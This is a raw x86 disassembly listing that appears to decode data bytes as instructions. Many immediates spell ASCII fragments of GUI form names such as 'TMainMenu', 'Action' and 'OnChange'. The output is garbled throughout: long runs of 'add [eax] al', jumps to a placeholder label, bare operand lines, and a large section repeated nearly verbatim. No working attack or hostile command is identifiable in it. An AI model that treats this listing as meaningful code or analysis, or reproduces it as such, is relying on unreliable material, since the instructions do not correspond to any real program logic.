jne r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ah
add [ eax ] al
add eax [ eax ]
std
add dl al
xchg esi eax
inc esp
add dh dl
xchg esi eax
inc esp
add [ eax ] bl
add [ eax ] al
loopne r-xdata
je r-xdata
adc [ eax ] al
cmp al [ eax ]
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ eax ] eax
call 0x3444db90
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
xor eax [ eax ]
call 0x3044d69c
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
fiadd [ eax + eax + 0x38 ]
inc edi
inc ecx
add al cl
popfd
insd
dec esp
nop
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
dec ebp
outsb
jne r-xdata
add [ eax - 0x1d ] dh
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffda100041 ]
inc esp
add [ edx - 0x1753ffbc ] bh
inc esp
add al dh
out 0x44 eax
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shl [ edi + edx * 4 + 0x9070044 ] 0x54
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x68756e65
mov al 0x9e
inc ecx
add [ eax - 0x27ffbe61 ] ch
insd
jae r-xdata
mov eax [ 0xffffffffda100041 ]
inc esp
add [ edx - 0x24ffffbc ] bh
inc esp
add ah ch
rcr [ esi - 0x6147ffbf ] 0x41
add al ah
jb r-xdata
add [ eax ] al
xchg edi eax
inc esp
add ah bl
xchg esi eax
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ eax + 0x10044e7 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ ecx + edx * 4 ] al
inc esp
add [ eax - 0x5fffbb19 ] dl
out 0x44 eax
add [ ecx ] al
loop r-xdata
add [ eax ] al
fild [ eax + eax - 0x14 ]
inc eax
add [ eax - 0x69 ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
xchg edi eax
inc esp
add [ eax ] ah
add [ eax ] al
sub [ esi - 0x5e3fffbc ] dl
inc ecx
add ah ch
xor eax [ eax ]
adc al 0x9b
inc ecx
add ah dh
xor eax [ eax ]
call 0x3044d790
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
fiadd [ eax + eax + 0x38 ]
inc edi
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
dec ecx
je r-xdata
inc eax
add [ ecx ] al
add bh bh
sub al 0xe7
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
dec ebp
jb r-xdata
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
sahf
inc ecx
add [ eax - 0x27ffbe61 ] ch
insd
lea eax [ eax ]
je r-xdata
je r-xdata
outsb
je r-xdata
popad
rcl [ gs : 0x300041 ] 0x0
[ eax ]
out 0x44 eax
add [ eax ] dl
loopne r-xdata
add [ eax ] cl
add bh bh
xor al 0xe3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
jns r-xdata
add [ eax ] al
adc [ 0x6e4f0a00 ] 0x44
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffbb6a ] dh
jl r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
pop [ eax + eax + 0x50 ]
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
inc ecx
add [ eax ] al
[ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8c65646f
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
adc [ eax ] al
inc eax
add [ eax ] al
add al 0x91
inc esp
add [ eax - 0x3fffbb19 ] dh
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
xchg esi eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
inc esp
add [ 0x654c616d ] cl
je r-xdata
inc eax
cdq
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec esp
je r-xdata
dec ebp
outsb
sbb [ ecx + 0xf030044 ] 0x54
jo r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
add [ ecx + 0xf030044 ] bl
push esp
push eax
outsd
jb r-xdata
insd
popad
jae r-xdata
dec ecx
call eax
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jae r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
cdq
inc esp
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsb
je r-xdata
ja r-xdata
mov al 0x96
inc esp
add al ah
add [ eax ] al
insd
aam 0x8f
inc esp
add [ eax - 0x67010000 ] bl
add [ edi ] al
add [ eax - 0x1d ] dh
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffee900041 ]
inc esp
add [ edx - 0x24ffffbc ] bh
inc esp
add ah ch
loop r-xdata
je r-xdata
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
inc esp
add [ eax ] bh
inc edi
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ ecx + esi + 0x40 ] cl
add [ edi + ebp * 8 ] al
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
cwde
inc esp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
cld
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] bh
out dx eax
inc esp
add al dh
out dx eax
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7800449a ] dl
add [ eax ] al
add [ eax ] ch
xchg esi eax
inc esp
add al al
mov eax [ 0x33ec0041 ]
inc eax
outsd
inc edx
outsd
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + ebx * 4 ] bh
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add al 0x0
add [ eax ] al
outsb
jne r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax - 0x3fffbb19 ] dh
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
call 0x644de82
je r-xdata
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + eax ] al
0x96dc0044 0x44
adc [ eax ] al
add eax 0x756e654d
jae r-xdata
jns r-xdata
add [ eax - 0x5fffbb19 ] dl
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
jo r-xdata
cdq
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jne r-xdata
cdq
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
inc ecx
add ah dh
xor eax [ eax ]
call 0x3044da74
xor [ eax ] eax
dec esp
xor [ eax ] eax
add al 0xef
xor eax [ eax ]
adc al 0x9b
add [ ebp - 0x65b3ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ ecx + ebx * 4 + 0x44 ] edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449a ] ah
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
clc
loope r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add al 0x91
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
cwde
inc esp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
push ss
inc ecx
add [ edi + ebp * 8 + 0x44 ] cl
add [ edi + ebp * 8 + 0x44 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
pushfd
add al 0x91
inc esp
add [ ebx + ebx * 4 ] dl
shl [ ecx + 0x33ec0041 ] 0x40
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
mov al [ 0x700449a ]
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
[ edi ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
adc eax 0x300041
add bh bh
sbb bh ah
inc esp
add [ eax ] dl
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x800449d
add [ eax ] al
add ah ch
inc ebx
inc edx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
cdq
inc ebx
push 0x65676e61
or [ edi ] dl
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
xor eax [ eax ]
add [ esp + ebx + 0x33e00041 ] cl
inc eax
add ah ch
outsb
adc [ edi + 0x500044 ] cl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
je r-xdata
add al ah
xor eax [ eax ]
in al dx
shl al 0x9c
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 4 + 0x140044 ] al
add [ eax ] al
mov [ ecx + eax * 2 ] ds
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add bh bh
xor al 0xe3
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
cdq
inc esp
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
sub_449358
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
outsb
jne r-xdata
popad
jns r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
dec [ eax - 0x39 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
add [ eax ] al
call eax
mov [ eax + eax + 0x20 ] 0xcf
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
jl r-xdata
inc esp
add al ah
into
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
or al 0xc6
mov esp 0x3c004490
add [ eax ] al
[ eax + 0x10044d9 ]
adc [ eax ] al
cmp eax 0x70ff0000
int 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xf06d6574
push ss
inc ecx
add [ eax ] ah
add bh bh
fadd st7
inc esp
add [ eax + 0x44cf ] ah
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
imul esp [ eax + edx + 0x300040 ] 0x0
dec [ esi + eax * 8 ]
add [ eax ] al
pop es
add [ 0x61657242 ] al
inc esp
add [ eax ] al
iretd
cwde
inc ebx
jne r-xdata
add bh bh
push ss
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
jmp [ eax - 0x31 ]
inc ecx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add [ eax - 0x1d ] dh
inc ecx
add ah dh
xor eax [ eax ]
adc al 0x9b
ja r-xdata
outsb
jne r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] ah
add [ eax ] al
add eax [ eax ]
std
add dl al
xchg esi eax
inc esp
add dh dl
xchg esi eax
inc esp
add [ eax ] bl
add [ eax ] al
loopne r-xdata
je r-xdata
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ eax ] eax
call 0x3444db90
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
xor eax [ eax ]
call 0x3044d69c
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
fiadd [ eax + eax + 0x38 ]
inc edi
inc ecx
add al cl
popfd
insd
dec esp
nop
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
dec ebp
outsb
jne r-xdata
add [ eax - 0x1d ] dh
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffda100041 ]
inc esp
add [ edx - 0x1753ffbc ] bh
inc esp
add al dh
out 0x44 eax
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shl [ edi + edx * 4 + 0x9070044 ] 0x54
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x68756e65
mov al 0x9e
inc ecx
add [ eax - 0x27ffbe61 ] ch
insd
jae r-xdata
mov eax [ 0xffffffffda100041 ]
inc esp
add [ edx - 0x24ffffbc ] bh
inc esp
add ah ch
rcr [ esi - 0x6147ffbf ] 0x41
add al ah
jb r-xdata
add [ eax ] al
xchg edi eax
inc esp
add ah bl
xchg esi eax
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ eax + 0x10044e7 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ ecx + edx * 4 ] al
inc esp
add [ eax - 0x5fffbb19 ] dl
out 0x44 eax
add [ ecx ] al
loop r-xdata
add [ eax ] al
fild [ eax + eax - 0x14 ]
inc eax
add [ eax - 0x69 ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
xchg edi eax
inc esp
add [ eax ] ah
add [ eax ] al
sub [ esi - 0x5e3fffbc ] dl
inc ecx
add ah ch
xor eax [ eax ]
adc al 0x9b
inc ecx
add ah dh
xor eax [ eax ]
call 0x3044d790
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
fiadd [ eax + eax + 0x38 ]
inc edi
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
dec ecx
je r-xdata
inc eax
add [ ecx ] al
add bh bh
sub al 0xe7
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
dec ebp
jb r-xdata
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
sahf
inc ecx
add [ eax - 0x27ffbe61 ] ch
insd
lea eax [ eax ]
je r-xdata
je r-xdata
outsb
je r-xdata
popad
rcl [ gs : 0x300041 ] 0x0
[ eax ]
out 0x44 eax
add [ eax ] dl
loopne r-xdata
add [ eax ] cl
add bh bh
xor al 0xe3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
jns r-xdata
add [ eax ] al
adc [ 0x6e4f0a00 ] 0x44
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffbb6a ] dh
jl r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
pop [ eax + eax + 0x50 ]
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
inc ecx
add [ eax ] al
[ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8c65646f
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
adc [ eax ] al
inc eax
add [ eax ] al
add al 0x91
inc esp
add [ eax - 0x3fffbb19 ] dh
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
xchg esi eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
inc esp
add [ 0x654c616d ] cl
je r-xdata
inc eax
cdq
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec esp
je r-xdata
dec ebp
outsb
sbb [ ecx + 0xf030044 ] 0x54
jo r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
add [ ecx + 0xf030044 ] bl
push esp
push eax
outsd
jb r-xdata
insd
popad
jae r-xdata
dec ecx
call eax
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jae r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
cdq
inc esp
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsb
je r-xdata
ja r-xdata
mov al 0x96
inc esp
add al ah
add [ eax ] al
insd
aam 0x8f
inc esp
add [ eax - 0x67010000 ] bl
add [ edi ] al
add [ eax - 0x1d ] dh
inc esp
add [ eax - 0x57ffbe62 ] dh
lahf
inc ecx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffee900041 ]
inc esp
add [ edx - 0x24ffffbc ] bh
inc esp
add ah ch
loop r-xdata
je r-xdata
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
inc esp
add [ eax ] bh
inc edi
inc ecx
add al cl
popfd
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add ah dl
loop r-xdata
add [ ecx + esi + 0x40 ] cl
add [ edi + ebp * 8 ] al
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
cwde
inc esp
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
cld
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] bh
out dx eax
inc esp
add al dh
out dx eax
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7800449a ] dl
add [ eax ] al
add [ eax ] ch
xchg esi eax
inc esp
add al al
mov eax [ 0x33ec0041 ]
inc eax
outsd
inc edx
outsd
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + ebx * 4 ] bh
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add al 0x0
add [ eax ] al
outsb
jne r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax - 0x3fffbb19 ] dh
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
call 0x644de82
je r-xdata
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + eax ] al
0x96dc0044 0x44
adc [ eax ] al
add eax 0x756e654d
jae r-xdata
jns r-xdata
add [ eax - 0x5fffbb19 ] dl
out 0x44 eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
jo r-xdata
cdq
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jne r-xdata
cdq
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
inc ecx
add ah dh
xor eax [ eax ]
call 0x3044da74
xor [ eax ] eax
dec esp
xor [ eax ] eax
add al 0xef
xor eax [ eax ]
adc al 0x9b
add [ ebp - 0x65b3ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ ecx + ebx * 4 + 0x44 ] edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449a ] ah
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
clc
loope r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
